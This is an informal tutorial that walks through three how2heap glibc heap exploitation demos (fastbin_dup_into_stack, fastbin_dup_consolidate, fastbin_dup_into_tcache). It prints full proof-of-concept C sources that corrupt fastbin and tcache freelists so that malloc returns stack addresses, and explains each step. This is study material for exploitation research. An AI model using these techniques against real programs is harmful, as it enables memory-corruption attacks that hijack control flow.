Okay, lets get onto the next demonstration, which is fastbin_dup_into_stack

### fastbin_dup_into_stack.c

Here is the source to the script, in which you can find on how2heaps repository:

```c
#include <stdio.h>
#include <stdlib.h>
int main() {
    fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
           "returning a pointer to a controlled location (in this case, the stack).\n");

    unsigned long long stack_var;

    fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

    fprintf(stderr, "Allocating 3 buffers.\n");
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", a);
    fprintf(stderr, "2nd malloc(8): %p\n", b);
    fprintf(stderr, "3rd malloc(8): %p\n", c);

    fprintf(stderr, "Freeing the first one...\n");
    free(a);

    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a);

    fprintf(stderr, "So, instead, we'll free %p.\n", b);
    free(b);

    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    unsigned long long *d = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", d);
    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that malloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);
    stack_var = 0x20;

    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

Unfortunately, this attack only works with glibc 2.23. When you compile and run this script, you will be
met with the err message: "free(): invalid pointer", or it will just seg fault. If you do not see the
error message, run it in ltrace and it will show up.

This means the attack is irrelevant right, why are we learning this, are you wasting my time??

No, this will still greatly improve our understanding of such fastbin double free attacks, so lets walk
through this technique, and explain it's similarity to the others, and it's differences that make this
unique.

The more basic fastbin_dup attack was a simple double free vulnerability. In this script, we will leverage
the same double free vulnerability that the fastbins provide us, but with a twist. In this attack, we will
also be forging chunks.

in this POC however, they will not be filling up the tcache, since it did not exist in glibc 2.23. We can
just go with it, since we dont really need a working POC, we only need the script that demonstrates what
is happening.

Okay, so lets just assume we have the same double free scenario, two pointers within our fastbin
to the same chunk. Lets continue after that fact.

```c
    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    unsigned long long *d = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", d);
    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that malloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);
```

okay, lets read this. It will show us our fastbin freelist, which contains a, b, and another a. It will
then tell us that the attack will involve modifying the data within our "a" chunk. It will then
malloc another chunk, and another chunk to get the pointers to "a", and "b" out of the fastbin.

the fastbin will now ONLY contain the pointer to the "a" chunk, that it has already returned. the pointer
to "a", is now stored within "d".

As it states, we have access to the top of the fastbin freelist, since we have 2 pointers to the same chunk.
Okay, so this attack will involve us writing a FAKE free size, onto the stack. Malloc will then be tricked
into thinking that there is a free chunk on the stack, and return a pointer to it. This means that
we will be able to write onto the stack, and hopefully hijack some ret addresses.

The others, not so much..

```c

    stack_var = 0x20;
    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

Finally, we have the end of our script. This is where they will fake a chunk to point to the stack, and
malloc another chunk. This means that we now have a pointer to the stack, that would be allowed to read
and write depending on the program we are exploiting.

## fastbin_dup_consolidate.c

This is another interesting technique that was completely abolished due to mitigations being implemented
with time, so this is another one that resides within the archaic glibc 2.23.

This is a pretty short script, and a pretty simple technique, so it shouldnt take too long to explain

here is the source to the poc/explanation:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
```

The premise of this technique, is to leverage malloc_consolidate to return a pointer to the same
chunk, whilst still containing the entry within either the fastbin, or unsorted bin.

A few problems reside within this exploit script, since it is using an archaic glibc, it will not really
work with the modern day ptmalloc as well. In this script, it is relying on malloc_consolidate to move
the chunk into the unsorted bin, rather than merging with neighboring chunks.

It also doesnt know that the tcache exists within our system, so it thinks that we are caching in the
fastbin freelist, rather than the tcache.

I will attempt to explain this with the rules regarding glibc 2.23, but dont get confused, this is old
old shit man.

okay, we are starting off by allocating 2 chunks, with equals sizes of 64 in decimal. This is not 16/0x10
bytes aligned, so it will allocate a useable chunk of 72 instead(considering 2.23 had this feature).

it will allocate 2 fastbins, and free the first pointer. They will then allocate a large bin by allocating
0x400 bytes from the system. In modern day, this will still be cached within the tcache, but back then
tcache was not a heavy lifter, it was probably still on a drawing board. So allocating a fastbin will
apparently call malloc_consolidate, which will apparently move the fasttop chunk into the unsorted bin.

This means that there is a pointer in the unsorted bin, and nothing in the fastbin. But then, they allocate
the p1 pointer ANOTHER time, and there is a new pointer added within the fastbin. This will not abort, as
the p1 pointer is NOT the fasttop chunk, as it has been moved into the unsorted bin. This will create
2 pointers to the same chunk :)

## fastbin_dup_into_tcache.c
This was still an applicable technique as recent as glibc 2.31. This is a much more sophisticated technique
that will require a lot of explaining to do. If you feel I did not do a good job at explaining this
technique, feel free to check out the source in which I had learned this:

https://www.youtube.com/watch?v=ctnnan4Nth4

Okay, lets get onto the explanation.

Here is the source of the binary:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);

  printf(
    "\n"
    "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
    "except it works with a small allocation size (allocsize <= 0x78).\n"
    "The goal is to set things up so that a call to malloc(allocsize) will write\n"
    "a large unsigned value to the stack.\n\n"
  );

  // Allocate 14 times so that we can free later.
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* victim = ptrs[7];
  printf(
    "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
    "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
    "already full, it will go in the fastbin.\n\n",
    victim
  );
  free(victim);

  printf(
    "Next we need to free between 1 and 6 more pointers. These will also go\n"
    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
    "cause a segmentation fault. But if the value on the stack is zero then\n"
    "a single free is sufficient.\n\n"
  );

  // Fill the fastbin.
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  printf(
    "The stack address that we intend to target: %p\n"
    "It's current value is %p\n",
    &stack_var[2],
    (char*)stack_var[2]
  );

  printf(
    "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
    "to overwrite the next pointer at address %p\n\n",
    victim
  );

  //------------VULNERABILITY-----------

  // Overwrite linked list pointer in victim.
  *(size_t**)victim = &stack_var[0];

  //------------------------------------

  printf(
    "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
  );

  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "Let's just print the contents of our array on the stack now,\n"
    "to show that it hasn't been modified yet.\n\n"
  );

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  printf(
    "\n"
    "The next allocation triggers the stack to be overwritten. The tcache\n"
    "is empty, but the fastbin isn't, so the next allocation comes from the\n"
    "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
    "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
    "address that we are targeting ends up being the first chunk in the tcache.\n"
    "It contains a pointer to the next chunk in the list, which is why a heap\n"
    "pointer is written to the stack.\n"
    "\n"
    "Earlier we said that the attack will also work if we free fewer than 6\n"
    "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
    "That's because the value on the stack is treated as a next pointer in the\n"
    "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
    "\n"
    "The contents of our array on the stack now look like this:\n\n"
  );

  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  printf(
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  assert(q == (char *)&stack_var[2]);

  return 0;
}
```

The size of this script is pretty large compared to the others, so I will be explaining the script
in little chunks of the source so we dont lose track on what we are actually talking about. Lets review
the first part of this script

```c
const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);

  printf(
    "\n"
    "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
    "except it works with a small allocation size (allocsize <= 0x78).\n"
    "The goal is to set things up so that a call to malloc(allocsize) will write\n"
    "a large unsigned value to the stack.\n\n"
  );
```

So it will define a designated chunk size within an unsigned integer. 0x40 in decimal is 64. This is not
within the 16 padded chunks, so it will allocate a real USABLE chunk size of 72. Including metadata will
equal to 80 bytes, +1 for the flags.

Next, within the main function, it will disable output buffering. Then, it gives us some context and
some insight into the origins of the technique, and where they are taking it. It tells us, that this
poc shares extreme similarities to the unsorted_bin_attack. This is very interesting, but I will not
be explaining this technique as that would quickly get off track.

The main premise of that technique, is to write some value onto the stack by overwriting a chunks bk
pointer, while it resides within an unsorted bin.

Okay, lets look at the next code snippet

```c
  // Allocate 14 times so that we can free later.
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }
```

This piece of code will simply fill up the tcache, so the next frees will cache the chunks within the
fastbin. It has allocated a total of 14 pointers/chunks of the same size, but only freed until the
tcache was exausted. This means that we will probably have a later use for the rest of those 7 pointers.

nothing else to say about that, lets move on

```c
  char* victim = ptrs[7];
  printf(
    "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
    "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
    "already full, it will go in the fastbin.\n\n",
    victim
  );
  free(victim);
```

there will be a victim pointer, which will point to the 7th chunk. The chunks 0 - 6 have been freed in
order to exaust the tcache, so this is the first pointer that hasnt been freed within the array.

This seems to also be the chunk that the attack is focusing on, as they clearly state. They will free that
victim chunk, and it is now within the fastbin.

```c
  printf(
    "Next we need to free between 1 and 6 more pointers. These will also go\n"
    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
    "cause a segmentation fault. But if the value on the stack is zero then\n"
    "a single free is sufficient.\n\n"
  );
```

Okay, this part is pretty important. It will tell us that it will free between 1-6 more chunks
into the fastbin, since those are the amount of chunks still left allocated. It will then tell
us that the stack address MUST be zero, else it will cause a segmentation fault.

To bypass this, we would need to free 6 more of the pointers, but if the stack is already zero
then a single free/chunk cached within the fastbin would be enough. This is due to the fact
that the stack values probably do not contain a valid next_chunk pointer.

Why is this?

Okay, so lets just say we are allowed to overwrite the next pointer using either a heap
overflow, or a uaf. We can overwrite the "next" pointer within our metadata to point to a
stack address.

Okay, but why does the stack have to be zero?

When we poison the next pointer within the chunk, the fastbin will still attempt to form a linked
list, since it is oblivious to the fact that the next pointer is actually the stack address. This
means that it will use the value ON THE STACK as the next pointer. So it will attempt to dereference
junk, which will inevitably cause a segmentation fault

This wont happen if the first value on the stack is 0, since the fastbin freelist will interpret it as
a NULL/0 pointer, and stop the list there.

```c
  // Fill the fastbin.
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  printf(
    "The stack address that we intend to target: %p\n"
    "It's current value is %p\n",
    &stack_var[2],
    (char*)stack_var[2]
  );
```

Okay, it will free the rest of the pointers into the fastbin to be cached. It will then create
a stack array and fill with garbage to store as the target we want to overwrite.

```c
  printf(
    "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
    "to overwrite the next pointer at address %p\n\n",
    victim
  );

  //------------VULNERABILITY-----------

  // Overwrite linked list pointer in victim.
  *(size_t**)victim = &stack_var[0];

  //------------------------------------
```

Next, we will leverage a "vulnerability" within the program to overwrite the next pointer to the
stack address. The victim chunk will now have a next pointer, that points to the stack.

```c
  printf(
    "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
  );

  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "Let's just print the contents of our array on the stack now,\n"
    "to show that it hasn't been modified yet.\n\n"
  );

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }
```

Next, it will completely empty out the tcache.

Some other functionality that the fastbin serves, that I had not mentions prior is that,
while fastbin is not empty and tcache not full, copy chunks. So it will copy the chunks
from the fastbin, into the tcache if everything has been cleared out. There was no mention
of this anywhere within any of the posts I had read, and I should probably include it in the
main section of the fastbin explanation.

Yes I will do that now, if you made it this far, i congratulate you since this is probably
pretty confusing. This is past me, speaking to future you where I have already updated the fastbin
section. Anyways, just a little reminder then.

I am tired, and my mind is getting a little bit wonky but I will try my best to continue the
explanation as best I can.

tl;dr of this snippet of code, it will transfer the fastbin chunks into the tcache, including the
poisoned chunk called victim.

```c
  printf(
    "\n"
    "The next allocation triggers the stack to be overwritten. The tcache\n"
    "is empty, but the fastbin isn't, so the next allocation comes from the\n"
    "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
    "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
    "address that we are targeting ends up being the first chunk in the tcache.\n"
    "It contains a pointer to the next chunk in the list, which is why a heap\n"
    "pointer is written to the stack.\n"
    "\n"
    "Earlier we said that the attack will also work if we free fewer than 6\n"
    "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
    "That's because the value on the stack is treated as a next pointer in the\n"
    "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
    "\n"
    "The contents of our array on the stack now look like this:\n\n"
  );
```

After everything is copied in reverse order, it will also copy the poisoned chunk that points
to the stack. This means that since the fastbin freelist has acknlowledged the stack pointer as
a valid freed chunk, it will copy it into the tcache FIRST. Then, will continue to copy the
rest of the chunks into the tcache, until no more within fastbin or until tcache is full.

This means that if we were to malloc another chunk, it will actually return a pointer to the
stack pointer that we have poisoned the victim chunk with, therefore granting us access to
the stack.

```c
  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  printf(
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  assert(q == (char *)&stack_var[2]);

  return 0;
```

yep, whilst testing on glibc 2.27 this works out perfectly.

I did not provide any visuals for this writeup, and i do not belive that it is satisfactory for
someone who wants to understand this cool technique, so once again i highly reccomend you watch
this video:

https://www.youtube.com/watch?v=ctnnan4Nth4

Anyways, thats it for fastbins, we have demonstrated a total of 4 fastbin exploitation techniques
from the how2heap repository.
